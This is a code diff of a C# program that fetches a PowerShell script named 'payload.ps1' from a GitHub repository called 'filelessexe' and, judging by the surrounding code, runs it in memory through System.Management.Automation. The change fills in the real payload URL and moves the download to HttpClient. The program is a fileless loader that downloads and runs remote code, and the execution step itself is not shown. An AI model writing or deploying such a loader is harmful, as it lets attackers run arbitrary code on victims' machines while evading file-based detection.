@@ -1,18 +1,19 @@
 using System;
-using System.Net;
+using System.Net.Http;
 using System.Management.Automation;
 using System.Text;
+using System.Threading.Tasks;
 
 class Program
 {
-    static void Main()
+    static async Task Main()
     {
         Console.WriteLine("[INFO] Starting PowerShell script execution.");
 
-        string payloadUrl = "__PAYLOAD_URL__";
+        string payloadUrl = "https://raw.githubusercontent.com/N4V33NM/filelessexe/refs/heads/main/payload.ps1";
         Console.WriteLine($"[INFO] Using payload URL: {payloadUrl}");
 
-        string payloadContent = FetchPayload(payloadUrl);
+        string payloadContent = await FetchPayload(payloadUrl);
 
         if (!string.IsNullOrEmpty(payloadContent))
         {
@@ -30,14 +31,14 @@ class Program
         Console.ReadLine();
     }
 
-    static string FetchPayload(string url)
+    static async Task<string> FetchPayload(string url)
     {
         try
         {
             Console.WriteLine($"[INFO] Fetching payload from: {url}");
-            using (WebClient client = new WebClient())
+            using (HttpClient client = new HttpClient())
             {
-                string content = client.DownloadString(url);
+                string content = await client.GetStringAsync(url);
                 Console.WriteLine("[SUCCESS] Payload fetched successfully!");
                 return content;
             }
@@ -45,7 +46,7 @@ class Program
         catch (Exception ex)
         {
             Console.WriteLine($"[ERROR] Failed to fetch payload: {ex.Message}");
-            return null;
+            return string.Empty;
         }
     }
 
@@ -85,5 +86,6 @@ class Program
         }
     }
 }
+
 
 
